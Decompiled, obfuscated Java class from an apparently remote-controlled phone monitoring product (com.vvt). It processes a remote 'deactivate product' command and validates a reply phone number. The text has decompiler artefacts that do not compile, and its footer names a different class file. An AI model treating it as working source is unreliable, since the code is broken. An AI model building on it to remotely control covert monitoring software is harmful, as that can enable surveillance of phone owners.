package com.vvt.remotecommand.processor.a;

import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.InvalidPhoneNumberException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;
import java.util.ArrayList;

public class c
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  
  public c(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  private void a(RemoteCommand paramRemoteCommand)
  {
    int i = 1;
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = paramRemoteCommand.getParameters();
    boolean bool4 = paramRemoteCommand.isReplyMesageRequired();
    boolean bool6 = a;
    int m;
    if ((!bool6) || (bool4))
    {
      m = ((ArrayList)localObject).size();
      if (m == i)
      {
        localObject = (String)((ArrayList)localObject).get(0);
        a(paramRemoteCommand, (String)localObject);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      int j = ((ArrayList)localObject).size();
      if (j == 0)
      {
        boolean bool2 = a;
        if (!bool2) {}
      }
      else
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
        m = ((ArrayList)localObject).size();
        if (m == i)
        {
          boolean bool5 = a;
          if (bool5) {}
          localObject = (String)((ArrayList)localObject).get(0);
          a(paramRemoteCommand, (String)localObject);
          paramRemoteCommand.setReplyMessageRequired(false);
        }
        else
        {
          int k = ((ArrayList)localObject).size();
          if (k != 0) {
            break;
          }
          boolean bool3 = a;
          if (!bool3) {}
        }
      }
    }
    localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    ((InvalidCommanFormatException)localObject).<init>();
    throw ((Throwable)localObject);
  }
  
  private void a(RemoteCommand paramRemoteCommand, String paramString)
  {
    boolean bool1 = com.vvt.ah.a.b(paramString);
    boolean bool2 = a;
    if ((!bool2) || (bool1))
    {
      paramRemoteCommand.setRecipient(paramString);
      return;
    }
    InvalidPhoneNumberException localInvalidPhoneNumberException = new com/vvt/remotecommand/exception/InvalidPhoneNumberException;
    localInvalidPhoneNumberException.<init>();
    throw localInvalidPhoneNumberException;
  }
  
  protected String a(Object paramObject)
  {
    boolean bool1 = false;
    Object localObject = null;
    boolean bool2 = paramObject instanceof RmtCtrlOutputStatusMessage;
    if (bool2)
    {
      localObject = paramObject;
      localObject = (RmtCtrlOutputStatusMessage)paramObject;
      bool1 = ((RmtCtrlOutputStatusMessage)localObject).isSuccess();
      if (!bool1) {
        break label36;
      }
    }
    label36:
    Object[] arrayOfObject;
    for (localObject = "Deactivation success. Nice!";; localObject = String.format("%s", arrayOfObject))
    {
      return (String)localObject;
      bool2 = true;
      arrayOfObject = new Object[bool2];
      paramObject = (RmtCtrlOutputStatusMessage)paramObject;
      String str = ((RmtCtrlOutputStatusMessage)paramObject).getMessage();
      arrayOfObject[0] = str;
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand, com.vvt.remotecommand.processor.c paramc)
  {
    boolean bool1 = a;
    if (bool1) {}
    bool1 = a;
    if (bool1) {}
    a(paramRemoteCommand);
    Object localObject1 = h();
    Object localObject2 = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.DEACTIVATE_PRODUCT;
    ((ControlCommand)localObject2).<init>(localRemoteFunction, null);
    localObject1 = ((com.vvt.remotecontrol.a)localObject1).execute((ControlCommand)localObject2);
    if (paramc != null)
    {
      localObject2 = a(localObject1);
      boolean bool2 = localObject1 instanceof RmtCtrlOutputStatusMessage;
      if (bool2)
      {
        localObject1 = (RmtCtrlOutputStatusMessage)localObject1;
        bool1 = ((RmtCtrlOutputStatusMessage)localObject1).isSuccess();
        bool2 = a;
        if ((bool2) && (!bool1)) {
          break label126;
        }
        paramc.b(paramRemoteCommand, this, (String)localObject2);
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      label126:
      if (localObject2 == null)
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
        localObject2 = "Unknown.";
        ((RemoteCommandException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
      }
      else
      {
        bool1 = a;
        if (bool1) {}
        localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
        ((RemoteCommandException)localObject1).<init>((String)localObject2);
        paramc.a(paramRemoteCommand, this, (RemoteCommandException)localObject1);
        continue;
        bool1 = a;
        if (!bool1) {}
      }
    }
  }
  
  public RemoteCommandProcessor.QueueCategory d()
  {
    return RemoteCommandProcessor.QueueCategory.MAIN;
  }
  
  public String e()
  {
    return "ProcDeactivate";
  }
  
  public boolean f()
  {
    return true;
  }
  
  public long g()
  {
    return 60000L;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/processor/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */